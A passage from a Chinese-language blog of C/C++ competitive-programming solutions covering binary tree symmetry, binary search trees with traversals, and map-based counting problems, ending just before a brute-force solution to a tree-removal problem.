<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">	<span class="type">char</span> c;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">node</span> *l, *r;</span><br><span class="line">&#125;*Tree;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">Tree <span class="title">build</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">	queue&lt;Tree&gt; q;</span><br><span class="line">	Tree root = <span class="keyword">new</span> node;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(s[<span class="number">0</span>] != <span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">		root-&gt;c = s[x++];</span><br><span class="line">		root-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">		root-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line">		q.<span class="built_in">push</span>(root);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">		Tree rt = q.<span class="built_in">front</span>();</span><br><span class="line">		q.<span class="built_in">pop</span>();</span><br><span class="line">		Tree l, r;</span><br><span class="line">		<span class="keyword">if</span>(s[x] == <span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">			l = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			l = <span class="keyword">new</span> node;</span><br><span class="line">			l-&gt;c = s[x];</span><br><span class="line">			q.<span class="built_in">push</span>(l);</span><br><span class="line">		&#125;</span><br><span class="line">		x++;</span><br><span class="line">		rt-&gt;l = l;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(s[x] == <span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">			r = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			r = <span class="keyword">new</span> node;</span><br><span class="line">			r-&gt;c = s[x];</span><br><span class="line">			q.<span class="built_in">push</span>(r);</span><br><span class="line">		&#125;</span><br><span class="line">		x++;</span><br><span class="line">		rt-&gt;r = r;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">judge</span><span class="params">(Tree l, Tree r)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(l == <span class="literal">NULL</span> &amp;&amp; r == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(l == <span class="literal">NULL</span> || r == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">judge</span>(l-&gt;l, r-&gt;r) &amp; <span class="built_in">judge</span>(l-&gt;r, r-&gt;l);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	string s;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">		Tree root;</span><br><span class="line">		root = <span class="built_in">build</span>(s);</span><br><span class="line">		Tree l = root-&gt;l, r = root-&gt;r;</span><br><span class="line">		<span class="type">bool</span> ans = <span class="built_in">judge</span>(l, r);</span><br><span class="line">		<span class="keyword">if</span>(ans) cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看别人写的也有直接对字符串进行对称判断的。第0-0个是第一层，1-2是第二层，3-6是第三层...，即i-j，下一层就是2i+1——2j+2，然后就简单了。奕</p>
<p>！悟！</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Judge</span><span class="params">(<span class="type">char</span> *s,<span class="type">int</span> start,<span class="type">int</span> end,<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (end&gt;=len)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start,j=end; i&lt;=j; i++,j--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((s[i]==<span class="string">&#x27;#&#x27;</span>&amp;&amp;s[j]!=<span class="string">&#x27;#&#x27;</span>)||(s[j]==<span class="string">&#x27;#&#x27;</span>&amp;&amp;s[i]!=<span class="string">&#x27;#&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Judge</span>(s,<span class="number">2</span>*start+<span class="number">1</span>,<span class="number">2</span>*end+<span class="number">2</span>,len);<span class="comment">//判断下一层</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">1000</span>];</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,<span class="built_in">Judge</span>(s,<span class="number">0</span>,<span class="number">0</span>,<span class="built_in">strlen</span>(s))?<span class="string">&quot;YES&quot;</span>:<span class="string">&quot;NO&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二叉排序树">二叉排序树</h2>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>左子树的比根节点小，右子树比根节点大，左右子树也都是二叉排序树</p>
<h3 id="二叉排序树2">二叉排序树2</h3>
<h5 id="题目描述-20">题目描述</h5>
<p>输入一系列整数，建立二叉排序树，并进行前序，中序，后序遍历。</p>
<h5 id="输入输出格式-18">输入输出格式</h5>
<h6 id="输入描述-20">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">输入第一行包括一个整数<span class="built_in">n</span>(<span class="comment">1&lt;=n&lt;=100</span>)。</span><br><span class="line">接下来的一行包括<span class="built_in">n</span>个整数。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-20">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">可能有多组测试数据，对于每组数据，将题目所给数据建立一个二叉排序树，并对二叉排序树进行前序、中序和后序遍历。</span><br><span class="line">每种遍历结果输出一行。每行最后一个数据之后有一个空格。</span><br><span class="line"></span><br><span class="line">输入中可能有重复元素，但是输出的二叉树遍历序列中重复元素不用输出。</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">	<span class="type">int</span> d;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">node</span> *l, *r;</span><br><span class="line">&#125; *Tree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(Tree &amp;t, <span class="type">int</span> a)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(t == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		t = <span class="keyword">new</span> node;</span><br><span class="line">		t-&gt;d = a;</span><br><span class="line">		t-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">		t-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(a == t-&gt;d) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span>(a &lt; t-&gt;d) <span class="built_in">build</span>(t-&gt;l, a);</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">build</span>(t-&gt;r, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PreOrdertraverse</span><span class="params">(Tree t)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(t != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		cout &lt;&lt; t-&gt;d &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		<span class="built_in">PreOrdertraverse</span>(t-&gt;l);</span><br><span class="line">		<span class="built_in">PreOrdertraverse</span>(t-&gt;r);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MidOrdertraverse</span><span class="params">(Tree t)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(t != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">MidOrdertraverse</span>(t-&gt;l);</span><br><span class="line">		cout &lt;&lt; t-&gt;d &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		<span class="built_in">MidOrdertraverse</span>(t-&gt;r);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PostOrdertraverse</span><span class="params">(Tree t)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(t != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">PostOrdertraverse</span>(t-&gt;l);</span><br><span class="line">		<span class="built_in">PostOrdertraverse</span>(t-&gt;r);</span><br><span class="line">		cout &lt;&lt; t-&gt;d &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		Tree root;</span><br><span class="line">		root = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="type">int</span> a;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; a;</span><br><span class="line">			<span class="built_in">build</span>(root, a);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">PreOrdertraverse</span>(root);</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">		<span class="built_in">MidOrdertraverse</span>(root);</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">		<span class="built_in">PostOrdertraverse</span>(root);</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="二叉搜索树">二叉搜索树</h1>
<h5 id="题目描述-21">题目描述</h5>
<p>判断两序列是否为同一二叉搜索树序列</p>
<h5 id="输入输出格式-19">输入输出格式</h5>
<h6 id="输入描述-21">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">开始一个数<span class="built_in">n</span>，(<span class="number">1</span>&lt;=<span class="built_in">n</span>&lt;=<span class="number">20</span>) 表示有<span class="built_in">n</span>个需要判断，<span class="built_in">n</span>= <span class="number">0</span> 的时候输入结束。</span><br><span class="line">接下去一行是一个序列，序列长度小于<span class="number">10</span>，包含(<span class="number">0</span>~<span class="number">9</span>)的数字，没有重复数字，根据这个序列可以构造出一颗二叉搜索树。</span><br><span class="line">接下去的<span class="built_in">n</span>行有<span class="built_in">n</span>个序列，每个序列格式跟第一个序列一样，请判断这两个序列是否能组成同一颗二叉搜索树。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-21">输出描述:</h6>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">如果序列相同则输出<span class="keyword">YES</span>，否则输出<span class="keyword">NO</span></span><br></pre></td></tr></table></figure>
<p>我的方法是对每个序列建一个树，然后存储和其前序遍历字符串进行比较</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">	<span class="type">char</span> d;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">node</span> *l, *r;</span><br><span class="line">&#125; *Tree;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(Tree &amp;t, <span class="type">char</span> a)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(t == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		t = <span class="keyword">new</span> node;</span><br><span class="line">		t-&gt;d = a;</span><br><span class="line">		t-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">		t-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(a == t-&gt;d) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span>(a &lt; t-&gt;d) <span class="built_in">build</span>(t-&gt;l, a);</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">build</span>(t-&gt;r, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PreOrdertraverse</span><span class="params">(Tree t, string &amp;s)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(t != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		s+= t-&gt;d;</span><br><span class="line">		<span class="built_in">PreOrdertraverse</span>(t-&gt;l, s);</span><br><span class="line">		<span class="built_in">PreOrdertraverse</span>(t-&gt;r, s);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		Tree root;</span><br><span class="line">		root = <span class="literal">NULL</span>;</span><br><span class="line">		string s, s0;</span><br><span class="line">		cin &gt;&gt; s;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">			<span class="built_in">build</span>(root, s[i]); </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">PreOrdertraverse</span>(root, s0);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			string st;</span><br><span class="line">			cin &gt;&gt; s;</span><br><span class="line">			Tree rt;</span><br><span class="line">			rt = <span class="literal">NULL</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; s.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">				<span class="built_in">build</span>(rt, s[j]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">PreOrdertraverse</span>(rt, st);</span><br><span class="line">			<span class="keyword">if</span>(st == s0)&#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看了下别人的方法，需要前序和中序才能确定一颗唯一的树，我只用了前序应该是有问题的，但测试用例应该里没有专门设计一个这样的用例233.</p>
<h3 id="二叉排序树---华科">二叉排序树 - 华科</h3>
<h5 id="题目描述-22">题目描述</h5>
<p>二叉排序树，也称为二叉查找树。可以是一颗空树，也可以是一颗具有如下特性的非空二叉树：
1. 若左子树非空，则左子树上所有节点关键字值均不大于根节点的关键字值； 2.
若右子树非空，则右子树上所有节点关键字值均不小于根节点的关键字值； 3.
左、右子树本身也是一颗二叉排序树。
现在给你N个关键字值各不相同的节点，要求你按顺序插入一个初始为空树的二叉排序树中，每次插入后成功后，求相应的父亲节点的关键字值，如果没有父亲节点，则输出-1。</p>
<h5 id="输入输出格式-20">输入输出格式</h5>
<h6 id="输入描述-22">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">输入包含多组测试数据，每组测试数据两行。</span><br><span class="line">第一行，一个数字<span class="built_in">N</span>（<span class="built_in">N</span>&lt;=<span class="number">100</span>），表示待插入的节点数。</span><br><span class="line">第二行，<span class="built_in">N</span>个互不相同的正整数，表示要顺序插入节点的关键字值，这些值不超过<span class="number">10</span>^<span class="number">8</span>。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-22">输出描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">输出共<span class="built_in">N</span>行，每次插入节点后，该节点对应的父亲节点的关键字值。</span><br></pre></td></tr></table></figure>
<p>边插入边找，递归的函数加一个参数作为根节点即可</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">	<span class="type">int</span> d;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">node</span> *l, *r;</span><br><span class="line">&#125;*Tree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">build</span><span class="params">(Tree r, Tree &amp;t, <span class="type">int</span> a)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> res;</span><br><span class="line">	<span class="keyword">if</span>(t == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		t = <span class="keyword">new</span> node;</span><br><span class="line">		t-&gt;d = a;</span><br><span class="line">		t-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">		t-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> r-&gt;d;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(a == t-&gt;d) res = r-&gt;d;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(a &lt; t-&gt;d) res = <span class="built_in">build</span>(t, t-&gt;l, a);</span><br><span class="line">	<span class="keyword">else</span> res = <span class="built_in">build</span>(t, t-&gt;r, a);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		Tree tmp = <span class="keyword">new</span> node;</span><br><span class="line">		tmp-&gt;d = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">		Tree root;</span><br><span class="line">		root = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="type">int</span> a[n];</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; a[i];</span><br><span class="line">			<span class="type">int</span> x = <span class="built_in">build</span>(tmp, root, a[i]);</span><br><span class="line">			cout &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="hash">hash</h2>
<h3 id="统计同成绩学生人数">统计同成绩学生人数</h3>
<h5 id="题目描述-23">题目描述</h5>
<p>读入N名学生的成绩，将获得某一给定分数的学生人数输出。</p>
<h5 id="输入输出格式-21">输入输出格式</h5>
<h6 id="输入描述-23">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">测试输入包含若干测试用例，每个测试用例的格式为</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第<span class="number">1</span>行：<span class="built_in">N</span></span><br><span class="line">第<span class="number">2</span>行：<span class="built_in">N</span>名学生的成绩，相邻两数字用一个空格间隔。</span><br><span class="line">第<span class="number">3</span>行：给定分数</span><br><span class="line"></span><br><span class="line">当读到<span class="built_in">N</span>=<span class="number">0</span>时输入结束。其中<span class="built_in">N</span>不超过<span class="number">1000</span>，成绩分数为（包含）<span class="number">0</span>到<span class="number">100</span>之间的一个整数。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-23">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">对每个测试用例，将获得给定分数的学生人数输出。</span><br></pre></td></tr></table></figure>
<p>直接map</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		<span class="type">int</span> a[n], sn;</span><br><span class="line">		map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; m;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; a[i];</span><br><span class="line">			m[a[i]] ++;</span><br><span class="line">		&#125;</span><br><span class="line">		cin &gt;&gt; sn;</span><br><span class="line">		<span class="keyword">if</span>(m.<span class="built_in">find</span>(sn) != m.<span class="built_in">end</span>())&#123;</span><br><span class="line">			cout &lt;&lt; m[sn] &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			cout &lt;&lt; <span class="number">0</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="谁是你的潜在朋友">谁是你的潜在朋友</h3>
<h5 id="题目描述-24">题目描述</h5>
<pre><code>“臭味相投”——这是我们描述朋友时喜欢用的词汇。两个人是朋友通常意味着他们存在着许多共同的兴趣。然而作为一个宅男，你发现自己与他人相互了解的机会并不太多。幸运的是，你意外得到了一份北大图书馆的图书借阅记录，于是你挑灯熬夜地编程，想从中发现潜在的朋友。     首先你对借阅记录进行了一番整理，把N个读者依次编号为1,2,…,N，把M本书依次编号为1,2,…,M。同时，按照“臭味相投”的原则，和你喜欢读同一本书的人，就是你的潜在朋友。你现在的任务是从这份借阅记录中计算出每个人有几个潜在朋友。</code></pre>
<h5 id="输入输出格式-22">输入输出格式</h5>
<h6 id="输入描述-24">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">每个案例第一行两个整数<span class="built_in">N</span>,M，<span class="number">2</span> &lt;= <span class="built_in">N</span> ，M&lt;= <span class="number">200</span>。接下来有<span class="built_in">N</span>行，第i(i = <span class="number">1</span>,<span class="number">2</span>,…,<span class="built_in">N</span>)行每一行有一个数，表示读者i-<span class="number">1</span>最喜欢的图书的编号P(<span class="number">1</span>&lt;=P&lt;=M)</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-24">输出描述:</h6>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">每个案例包括N行，每行一个数，第<span class="selector-tag">i</span>行的数表示读者<span class="selector-tag">i</span>有几个潜在朋友。如果<span class="selector-tag">i</span>和任何人都没有共同喜欢的书，则输出“BeiJu”（即悲剧，^ ^）</span><br></pre></td></tr></table></figure>
<p>mapmap</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line">		map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; mm;</span><br><span class="line">		<span class="type">int</span> a[n];</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; a[i];</span><br><span class="line">			mm[a[i]]++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(mm[a[i]] == <span class="number">1</span>)&#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;BeiJu&quot;</span> &lt;&lt; endl;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> cout &lt;&lt; mm[a[i]] - <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="剩下的树">剩下的树</h3>
<h5 id="题目描述-25">题目描述</h5>
<p>有一个长度为整数L(1&lt;=L&lt;=10000)的马路，可以想象成数轴上长度为L的一个线段，起点是坐标原点，在每个整数坐标点有一棵树，即在0,1,2，...，L共L+1个位置上有L+1棵树。
现在要移走一些树，移走的树的区间用一对数字表示，如 100
200表示移走从100到200之间（包括端点）所有的树。
可能有M(1&lt;=M&lt;=100)个区间，区间之间可能有重叠。现在要求移走所有区间的树之后剩下的树的个数。</p>
<h5 id="输入输出格式-23">输入输出格式</h5>
<h6 id="输入描述-25">输入描述:</h6>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">两个整数L(<span class="number">1</span>&lt;<span class="operator">=</span>L&lt;<span class="operator">=</span><span class="number">10000</span>)和M(<span class="number">1</span>&lt;<span class="operator">=</span>M&lt;<span class="operator">=</span><span class="number">100</span>)。</span><br><span class="line">    接下来有M组整数，每组有一对数字。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-25">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">可能有多组输入数据，对于每组输入数据，输出一个数，表示移走所有区间的树之后剩下的树的个数。</span><br></pre></td></tr></table></figure>
<p>纯暴力的方法：</p>
